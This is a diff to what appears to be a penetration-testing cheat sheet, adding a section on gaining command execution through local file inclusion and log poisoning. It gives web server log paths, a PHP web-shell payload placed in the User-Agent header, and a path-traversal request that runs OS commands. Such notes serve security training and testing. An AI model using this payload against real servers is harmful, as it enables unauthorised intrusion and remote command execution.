@@ -72,7 +72,11 @@ Then execute the URL in linux console proceeded by cURL to get the code.
 Decrypt the code via command 
 > echo 'insert-code-here' | base64 -d
 /ilf_admin/index.php?
-*
+* RCE through Log Files
+Files will be at /var/log/apache2/access.log, /var/log/nginx/access.log, /var/log/sshd.log, /var/log/mail, and /var/log/vsftpd.log
+Start Burp Suite, intercept a request to the page, and send it to Repeater. Next, change the User-Agent header to something else such as Apache Log Poisoning and click Go
+Poisoned user agent is visible in the included log file. Modify User-Agent to a PHP shell such as <?php system($_GET['cmd']); ?>
+We can now execute OS-level commands by adding a parameter to the GET request. ie GET website.php?page=../../logs.log&cmd=id (id can be any command)
 
 
 ### Metasploit
